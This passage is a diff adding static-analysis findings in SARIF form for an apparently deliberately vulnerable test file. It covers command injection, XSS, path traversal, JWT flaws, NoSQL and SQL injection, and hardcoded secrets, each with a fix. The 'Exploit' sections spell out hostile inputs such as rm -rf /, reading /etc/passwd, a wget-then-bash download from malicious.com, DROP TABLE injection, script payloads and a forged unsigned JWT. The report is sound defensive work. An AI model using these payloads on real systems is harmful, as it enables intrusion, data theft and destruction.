+          "ruleId": "javascript.lang.security.detect-child-process.detect-child-process",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application directly executes a command string (`req.query.cmd`) received from user input without any sanitization or validation. This allows an attacker to inject arbitrary shell commands, leading to a Remote Command Execution (RCE) vulnerability.\n\nExploit: An attacker can send a request like `/run?cmd=ls%20-la` to list directory contents, or `/run?cmd=rm%20-rf%20/` (if permissions allow) to delete files, or `/run?cmd=cat%20/etc/passwd` to read sensitive system files.\n\nFix: Instead of directly executing a user-supplied command string with `exec`, use `child_process.execFile` or `spawn` where the command itself is hardcoded and only carefully validated user input is passed as arguments. This prevents command injection by treating user input as data, not executable code. This example fixes the vulnerability by forcing the execution of the `echo` command with the user input as a literal argument. For other specific commands, replace `echo` with the intended command and provide appropriate arguments."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 67
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 70,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Semgrep"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-006"
+          }
+        },
+        {
+          "ruleId": "javascript.express.security.injection.raw-html-format.raw-html-format",
+          "level": "error",
+          "message": {
+            "text": "[HIGH] User-supplied input (`req.query.q`) is directly embedded into the HTML response without proper sanitization or encoding. This allows an attacker to inject arbitrary HTML or JavaScript code, leading to a Cross-Site Scripting (XSS) vulnerability.\n\nExploit: An attacker can send a request like `/search?q=<script>alert('XSS')</script>`. When a user visits this URL, the injected script will execute in their browser context, potentially stealing cookies, session tokens, or performing actions on behalf of the user.\n\nFix: HTML-encode all user-supplied input before embedding it into HTML pages. This converts special characters like `<`, `>`, `&`, `'`, and `\"` into their HTML entity equivalents, preventing the browser from interpreting them as code. Using a dedicated HTML sanitization library (e.g., `dompurify`) or a templating engine with auto-escaping features is generally recommended for robust XSS prevention."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 81
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 45,
+            "confidenceLevel": "MEDIUM",
+            "detectedBy": [
+              "Semgrep"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-007"
+          }
+        },
+        {
+          "ruleId": "javascript_express_cross_site_scripting",
+          "level": "error",
+          "message": {
+            "text": "[HIGH] User-supplied input (`req.query.q`) is directly embedded into the HTTP response without proper sanitization or encoding. This allows an attacker to inject arbitrary HTML or JavaScript code, leading to a Cross-Site Scripting (XSS) vulnerability.\n\nExploit: An attacker can send a request like `/search?q=<img%20src=x%20onerror=alert('XSS')>`. When a user visits this URL, the injected script (or HTML tag) will execute in their browser, potentially leading to session hijacking, defacement, or redirection.\n\nFix: HTML-encode all user-supplied input before embedding it into HTML pages. This converts special characters like `<`, `>`, `&`, `'`, and `\"` into their HTML entity equivalents, preventing the browser from interpreting them as code. Using a dedicated HTML sanitization library (e.g., `dompurify`) or a templating engine with auto-escaping features is generally recommended for robust XSS prevention."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 81
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 75,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Semgrep",
+              "Bearer"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-008"
+          }
+        },
+        {
+          "ruleId": "javascript.express.express-fs-filename.express-fs-filename",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application directly constructs a file path (`fs.readFile(file, ...)`) using unsanitized user input (`req.query.file`). This allows an attacker to manipulate the file path using sequences like `../` to access or read files outside the intended directory, leading to a Path Traversal vulnerability.\n\nExploit: An attacker could send a request like `/read?file=../../../../etc/passwd` to read the system's password file, or `/read?file=../../../../app.js` to read application source code, depending on the application's privileges.\n\nFix: Sanitize and validate user-provided file paths. The fix uses `path.resolve` and `path.join` to normalize the path and then rigorously checks if the resolved path remains strictly within an explicitly defined base directory (`baseUploadsDirectory`). This prevents attackers from constructing paths that reach unauthorized locations on the file system. It's also important to configure appropriate file system permissions."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 92
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 45,
+            "confidenceLevel": "MEDIUM",
+            "detectedBy": [
+              "Semgrep"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-009"
+          }
+        },
+        {
+          "ruleId": "javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret",
+          "level": "error",
+          "message": {
+            "text": "[HIGH] The JWT signing secret (`'secret'`) is hardcoded directly into the source code. This is a critical security vulnerability because if the secret is discovered (e.g., through code leaks, reverse engineering), an attacker can forge valid JWTs, impersonate users, and bypass authentication.\n\nExploit: An attacker can decode a valid JWT to understand its structure (e.g., `{ userId: 1, username: 'testuser' }`), then use the hardcoded secret 'secret' to sign a new JWT with a modified payload (e.g., `{ userId: 999, username: 'admin' }`), thereby gaining unauthorized access as another user or administrator.\n\nFix: Replace the hardcoded secret with a value retrieved from a secure source, such as an environment variable (`process.env.JWT_SECRET`) or a dedicated secrets management system. This ensures the secret is not exposed in the codebase. For development, a robust random string should be generated if a fallback is absolutely necessary, but never use a simple 'secret' string even for fallback in production. It is also highly recommended to always include an `expiresIn` option for JWTs to limit their validity period and improve security."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 120
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 45,
+            "confidenceLevel": "MEDIUM",
+            "detectedBy": [
+              "Semgrep"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-010"
+          }
+        },
+        {
+          "ruleId": "javascript.jsonwebtoken.security.jwt-none-alg.jwt-none-alg",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The code explicitly allows the 'none' algorithm for JWT verification. This algorithm means no signature is expected or checked. An attacker can craft any token payload, set the 'alg' header to 'none', and the application will accept it as valid, effectively bypassing authentication or authorization checks. This is a severe integrity bypass vulnerability.\n\nExploit: An attacker can craft a JWT such as `eyJhbGciOiJub25lIn0.eyJ1c2VySWQiOjEyMywiaXNBZG1pbiI6dHJ1ZX0.` where the header declares 'alg': 'none' and the payload grants them administrative privileges. Since the application is configured to accept the 'none' algorithm, it will not perform any signature validation and will trust the attacker-controlled payload, granting unauthorized access.\n\nFix: By explicitly specifying a strong algorithm (e.g., 'HS256', 'RS256') and providing a strong, confidential secret key (retrieved from environment variables or a secure vault), the application will strictly enforce signature verification. This prevents attackers from forging tokens, as they won't possess the secret key needed to generate a valid signature. The secret key must not be empty or hardcoded."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 129
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 70,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Semgrep"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-011"
+          }
+        },
+        {
+          "ruleId": "javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret",
+          "level": "error",
+          "message": {
+            "text": "[HIGH] The JWT verification process relies on a secret key (`JWT_SECRET`) to ensure the token's integrity and authenticity. This secret is hardcoded directly within the source code. Hardcoding secrets makes them susceptible to exposure through various means like source code repositories, build logs, or even accidental disclosures. If leaked, an attacker can forge or modify JWTs that would be accepted as legitimate by the application.\n\nExploit: If an attacker gains access to the source code (e.g., through a public GitHub repository, a compromised developer machine, or exposed build artifacts), they will discover the hardcoded `JWT_SECRET`. With this secret, they can craft their own JWTs with arbitrary claims (e.g., `{\"userId\":123,\"isAdmin\":true}`) and sign them. The application would then incorrectly validate these forged tokens, granting the attacker unauthorized access or elevated privileges.\n\nFix: The secret key should be loaded from a secure source at runtime, such as environment variables (`process.env.JWT_SECRET`) or a dedicated secret management service (e.g., AWS Secrets Manager, HashiCorp Vault). This prevents the secret from being committed to source control or exposed in other insecure ways. It also allows for easier rotation of secrets without requiring code changes."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 138
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 45,
+            "confidenceLevel": "MEDIUM",
+            "detectedBy": [
+              "Semgrep"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-012"
+          }
+        },
+        {
+          "ruleId": "javascript.express.mongodb.express-mongo-nosqli.express-mongo-nosqli",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application constructs a Mongoose `findOne` query directly using user-supplied `username` and `password` from `req.body` without any sanitization or validation. An attacker can inject NoSQL query operators (e.g., `$ne`, `$gt`, `$or`) into these fields, manipulating the query logic to bypass authentication or gain unauthorized access to data.\n\nExploit: To bypass authentication, an attacker could send a request body like `{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}`. This query would find any user where both username and password are not null, effectively logging in as the first matching user. Another example for admin bypass could be `{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}` which might log in as admin without knowing the password.\n\nFix: Input values (username, password) should be explicitly validated and sanitized to ensure they are simple string literals and do not contain NoSQL operators or objects. For login scenarios, the best practice is to first query the user by a unique identifier (like username), then retrieve the stored hashed password and compare it with the provided plaintext password using a secure hashing algorithm (e.g., bcrypt). This prevents malicious NoSQL operators from being interpreted as part of the query structure and never queries with plaintext passwords directly."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 152
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 85,
+            "confidenceLevel": "VERY HIGH",
+            "detectedBy": [
+              "Semgrep",
+              "Bearer"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-013"
+          }
+        },
+        {
+          "ruleId": "javascript.express.mongodb.express-mongo-nosqli.express-mongo-nosqli",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application takes a `filter` parameter directly from `req.query`, parses it as JSON, and then uses the resulting object as the query object for `mongoose.model('User').find()`. This is an extremely dangerous pattern. An attacker can craft a malicious JSON string containing NoSQL operators (e.g., `$where`, `$or`, `$gt`) to execute arbitrary queries against the database, bypassing intended filters and potentially accessing, modifying, or deleting any data.\n\nExploit: An attacker could send a request like `/users/search?filter={\"$where\": \"this.isAdmin == true\"}`. This would return all users with the 'isAdmin' property set to true, potentially revealing sensitive information. More advanced attacks using operators like `$comment` or `$expr` could lead to full data exfiltration or arbitrary code execution within the database context.\n\nFix: Never directly pass user-controlled JSON objects into database queries. Instead, define an explicit whitelist of allowed query parameters and types. Construct the query object programmatically using only these validated and sanitized parameters. For example, if searching by username, take `req.query.username`, ensure it's a string, and then build `{ username: req.query.username }`. This ensures that only intended fields can be queried and prevents the injection of malicious operators or arbitrary query construction."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 168
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 70,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Semgrep"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-014"
+          }
+        },
+        {
+          "ruleId": "javascript_express_cross_site_scripting",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application fetches content from a user-provided URL (`req.query.url`) using `axios.get()` and then directly sends the raw response data (`response.data`) back to the client using `res.send()`. This creates a severe Reflected Cross-Site Scripting (XSS) vulnerability, often compounded by Server-Side Request Forgery (SSRF). If an attacker provides a URL pointing to a malicious server that returns HTML containing JavaScript, that script will be executed in the victim's browser when they view the response, leading to session hijacking, credential theft, or defacement.\n\nExploit: An attacker crafts a URL like `http://localhost:3000/fetch?url=http://attacker.com/malicious.html`. The server would fetch `malicious.html` from `attacker.com`. If `malicious.html` contains `<script>alert(document.cookie)</script>`, the server then sends this content directly to the victim's browser via `res.send()`. The browser executes the JavaScript, potentially stealing the victim's session cookies or performing other malicious actions within the context of the application's domain.\n\nFix: Before sending any user-controlled or externally fetched content back to the browser, it must be thoroughly sanitized to remove any malicious scripts or HTML tags. If the content is expected to be plain text, ensure it is properly encoded (e.g., using `encodeURIComponent`). If HTML is expected, use a robust HTML sanitization library (like `DOMPurify` on the server-side) to remove dangerous elements and attributes. Additionally, the URL itself (`req.query.url`) must be strictly validated against an allowlist of trusted domains or patterns to mitigate the underlying Server-Side Request Forgery (SSRF) risk, preventing the server from fetching malicious content in the first place."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 182
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 75,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Semgrep",
+              "Bearer"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-015"
+          }
+        },
+        {
+          "ruleId": "javascript.mysql.node-mysql-hardcoded-secret.node-mysql-hardcoded-secret",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The database password (`DB_PASSWORD`) is hardcoded directly into the application's source code (line 234). This practice makes the secret vulnerable to exposure if the source code is ever accessed by unauthorized individuals (e.g., via version control, misconfigured servers, or reverse engineering). An attacker obtaining this password can gain unauthorized access to the database, potentially leading to data breaches, modification, or destruction.\n\nExploit: If an attacker gains access to the source code repository or the deployed application bundle, they can easily extract the `DB_PASSWORD`. With this password, they can connect to the 'users' database as 'root' (as specified in line 233) and perform any operation, such as reading all user data, modifying credentials, or deleting the database. For example, `mysql -h localhost -u root -p[DB_PASSWORD] users`.\n\nFix: Instead of hardcoding the password, it is retrieved from `process.env.DB_PASSWORD`. This ensures that the secret is not stored directly in the source code. The password should be provided to the application via environment variables (e.g., using a `.env` file in development and proper environment configuration in production), which makes it significantly harder for attackers to discover. `dotenv` is included to manage environment variables from a `.env` file."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 231
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "Instead of hardcoding the password, it is retrieved from `process.env.DB_PASSWORD`. This ensures that the secret is not stored directly in the source code. The password should be provided to the application via environment variables (e.g., using a `.env` file in development and proper environment configuration in production), which makes it significantly harder for attackers to discover. `dotenv` is included to manage environment variables from a `.env` file."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/test-vuln-2.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 231
+                      },
+                      "insertedContent": {
+                        "text": "require('dotenv').config();\n  const db = mysql.createConnection({\n    host: 'localhost',\n    user: 'root',\n    password: process.env.DB_PASSWORD, // Retrieve from environment variable\n    database: 'users'\n  })"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 45,
+            "confidenceLevel": "MEDIUM",
+            "detectedBy": [
+              "Semgrep"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-016"
+          }
+        },
+        {
+          "ruleId": "javascript.express.mysql.express-mysql-sqli.express-mysql-sqli",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The `username` and `password` values from the request body (line 229) are directly concatenated into the SQL `INSERT` query string without proper sanitization or parameterization. This creates a classic SQL Injection vulnerability. An attacker can inject malicious SQL code into these fields, altering the query's intent, bypassing authentication, or executing arbitrary database commands.\n\nExploit: If an attacker sends `username: \"admin', 'pwned'); DROP TABLE users; --\"` and `password: \"any\"` in the request body, the resulting query would become: `INSERT INTO users VALUES ('admin', 'pwned'); DROP TABLE users; --', 'any')`. This would insert a new user, then attempt to drop the `users` table, and the `--` comments out the rest of the original password value, potentially leading to data loss and service disruption.\n\nFix: The query is rewritten to use parameterized queries with `?` placeholders. The `username` and `password` values are passed as an array of parameters to the `db.query` method. The `mysql` driver then correctly escapes these values before inserting them into the query, preventing any injected SQL from being executed as part of the statement. Error handling is also added for robustness."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 237
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "The query is rewritten to use parameterized queries with `?` placeholders. The `username` and `password` values are passed as an array of parameters to the `db.query` method. The `mysql` driver then correctly escapes these values before inserting them into the query, preventing any injected SQL from being executed as part of the statement. Error handling is also added for robustness."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/test-vuln-2.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 237
+                      },
+                      "insertedContent": {
+                        "text": "db.query(\n    'INSERT INTO users (username, password) VALUES (?, ?)', // Use placeholders\n    [username, password], // Pass parameters as an array\n    (error, results) => {\n      if (error) {\n        console.error('Database error:', error);\n        res.status(500).json({ error: 'Failed to create user' });\n        return;\n      }\n      res.json({ created: true });\n    }\n  );"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 85,
+            "confidenceLevel": "VERY HIGH",
+            "detectedBy": [
+              "Semgrep",
+              "Bearer"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-017"
+          }
+        },
+        {
+          "ruleId": "javascript_express_hardcoded_secret",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The JWT signing secret `'secret'` (line 120) is hardcoded directly into the application's source code. A hardcoded secret is easily discoverable if the source code is compromised or reverse-engineered. If an attacker knows the JWT signing secret, they can forge valid JWTs, impersonate users, and gain unauthorized access to protected resources without needing to authenticate.\n\nExploit: An attacker can decode a legitimate JWT from the application, observe the payload (e.g., `{ userId: 1, username: \"test\" }`), and then craft their own JWT with a different `userId` or `username` (e.g., `{ userId: 999, username: \"admin\" }`). Since they know the hardcoded secret `'secret'`, they can sign this forged payload, creating a valid token that the application will trust, allowing them to bypass authentication and impersonate an administrator.\n\nFix: The JWT secret is retrieved from `process.env.JWT_SECRET` instead of being hardcoded. This prevents the secret from being exposed in the source code. The secret should be a strong, randomly generated string stored securely as an environment variable. Additionally, `expiresIn: '1h'` is added to introduce an expiration time for the JWT, which is a crucial security practice to mitigate token replay attacks, as indicated by the original code comment."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 118
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "The JWT secret is retrieved from `process.env.JWT_SECRET` instead of being hardcoded. This prevents the secret from being exposed in the source code. The secret should be a strong, randomly generated string stored securely as an environment variable. Additionally, `expiresIn: '1h'` is added to introduce an expiration time for the JWT, which is a crucial security practice to mitigate token replay attacks, as indicated by the original code comment."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/test-vuln-2.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 118
+                      },
+                      "insertedContent": {
+                        "text": "require('dotenv').config();\n  const token = jwt.sign(\n    { userId: 1, username },\n    process.env.JWT_SECRET, // Retrieve from environment variable\n    { expiresIn: '1h' } // Add an expiry to tokens\n  )"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-018"
+          }
+        },
+        {
+          "ruleId": "javascript_express_nosql_injection",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application directly takes the `filter` parameter from the request query string (line 166), parses it as JSON, and uses the resulting object as a query for `mongoose.model('User').find()`. This allows an attacker to inject arbitrary query operators (e.g., `$where`, `$gt`, `$ne`) or modify the query logic, leading to unauthorized data access, modification, or even authentication bypass depending on the context. This is a classic NoSQL Injection vulnerability.\n\nExploit: An attacker could send a request like `GET /users/search?filter={\"username\":{\"$ne\":null}}` to retrieve all users where the username is not null (effectively all users). More maliciously, `GET /users/search?filter={\"$where\":\"function() { return sleep(10000) }\"}` could trigger denial of service, or `GET /users/search?filter={\"username\":{\"$regex\":\".*\",\"$options\":\"i\"}}` to bypass intended filters and dump all users, potentially including sensitive data.\n\nFix: Instead of directly parsing and using the user-provided JSON as the query object, the application should strictly validate and construct the query object based on allowed fields and operations. The example demonstrates constructing a `query` object by explicitly checking for and assigning only allowed fields (e.g., `username`). Input values are also explicitly cast to `String` to prevent type-based attacks. This prevents an attacker from injecting arbitrary MongoDB operators or fields into the query. Input validation and whitelist filtering are crucial here."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 167
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-019"
+          }
+        },
+        {
+          "ruleId": "javascript_lang_dynamic_os_command",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application directly takes the `cmd` parameter from the request query string (line 65) and executes it using `child_process.exec()`. There is no sanitization or validation of the user-provided input. This creates a critical Command Injection vulnerability, allowing an attacker to inject arbitrary shell commands, which will be executed on the server with the privileges of the Node.js process.\n\nExploit: An attacker could send a request like `GET /run?cmd=ls%20-la` to list files in the current directory. More critically, `GET /run?cmd=rm%20-rf%20/` (delete everything), `GET /run?cmd=cat%20/etc/passwd` (read sensitive system files), or `GET /run?cmd=wget%20malicious.com/shell.sh%3B%20bash%20shell.sh` (download and execute a malicious script) could be executed, leading to full system compromise.\n\nFix: The fix involves several layers of defense. First, instead of `exec`, which spawns a shell and evaluates the command string, `child_process.spawn()` is used. `spawn` executes the command directly without invoking a shell, making it harder for shell metacharacters to have an effect. Second, and most importantly, input validation is implemented using a strict whitelist approach. Only predefined commands (`echo`, `ls` in this example) are allowed, and their arguments are strictly sanitized using regular expressions to ensure they contain only safe characters. This prevents attackers from injecting arbitrary commands or manipulating the original command with shell operators."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 67
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-020"
+          }
+        },
+        {
+          "ruleId": "hardcoded_secret",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] A Stripe test API key (`sk_test_...`) is hardcoded directly into the source code. Hardcoding any secret, even a test key, is a critical security vulnerability as it makes the credential accessible to anyone with access to the codebase. This can lead to unauthorized use or, if a similar pattern is used for live keys, a path to production compromise.\n\nExploit: An attacker with access to the source code repository or build artifacts could easily extract the `sk_test_123456789abcdef` key. While this is a test key, it can still be used to interact with the Stripe API's test environment, potentially leading to abuse or helping an attacker infer patterns for discovering live API keys if they are also hardcoded elsewhere.\n\nFix: Replace the hardcoded Stripe API key with an environment variable. Environment variables should be loaded securely at runtime and managed through a secrets management system (e.g., AWS Secrets Manager, HashiCorp Vault) for production environments. This prevents the secret from being embedded in the source code."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 33
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "Replace the hardcoded Stripe API key with an environment variable. Environment variables should be loaded securely at runtime and managed through a secrets management system (e.g., AWS Secrets Manager, HashiCorp Vault) for production environments. This prevents the secret from being embedded in the source code."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/test-vuln-2.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 33
+                      },
+                      "insertedContent": {
+                        "text": "const API_KEY = process.env.STRIPE_API_KEY;"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 85,
+            "confidenceLevel": "VERY HIGH",
+            "detectedBy": [
+              "Bearer",
+              "Gitleaks"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-021"
+          }
+        },
+        {
+          "ruleId": "javascript_lang_hardcoded_secret",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] A database password (`DB_PASSWORD`) is hardcoded directly into the source code. Hardcoding sensitive credentials like database passwords is a severe security flaw because it exposes the password to anyone who can view the code, including developers, CI/CD systems, and potential attackers.\n\nExploit: An attacker who gains access to the application's source code can easily extract the `SuperSecretPassword123` value. This password could then be used to connect directly to the database (assuming network accessibility), bypassing the application's authentication and potentially leading to full data exfiltration, modification, or deletion.\n\nFix: Replace the hardcoded database password with an environment variable. For production environments, sensitive credentials like database passwords should be stored and retrieved using a dedicated secrets management solution (e.g., AWS Secrets Manager, Azure Key Vault, HashiCorp Vault) rather than being hardcoded or even relying solely on environment variables."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 34
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "Replace the hardcoded database password with an environment variable. For production environments, sensitive credentials like database passwords should be stored and retrieved using a dedicated secrets management solution (e.g., AWS Secrets Manager, Azure Key Vault, HashiCorp Vault) rather than being hardcoded or even relying solely on environment variables."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/test-vuln-2.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 34
+                      },
+                      "insertedContent": {
+                        "text": "const DB_PASSWORD = process.env.DB_PASSWORD;"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-022"
+          }
+        },
+        {
+          "ruleId": "javascript_lang_hardcoded_secret",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] A JWT (JSON Web Token) secret (`JWT_SECRET`) is hardcoded into the source code. The JWT secret is crucial for signing and verifying the integrity of JWTs, which are commonly used for authentication and authorization. Hardcoding it makes it vulnerable to disclosure, compromising the security of tokens.\n\nExploit: If an attacker gains access to the source code and extracts `mysecretkey123`, they can then forge valid JWTs. This could allow them to create tokens for any user, including administrators, effectively bypassing authentication and authorization controls to gain unauthorized access to protected resources or elevate their privileges within the application.\n\nFix: Replace the hardcoded JWT secret with an environment variable. For production, the JWT secret should be a strong, cryptographically secure random string, and it must be managed through a secure secrets management system (e.g., AWS Secrets Manager, HashiCorp Vault) to ensure it is never committed to source control and is securely loaded at runtime."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 35
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "Replace the hardcoded JWT secret with an environment variable. For production, the JWT secret should be a strong, cryptographically secure random string, and it must be managed through a secure secrets management system (e.g., AWS Secrets Manager, HashiCorp Vault) to ensure it is never committed to source control and is securely loaded at runtime."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/test-vuln-2.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
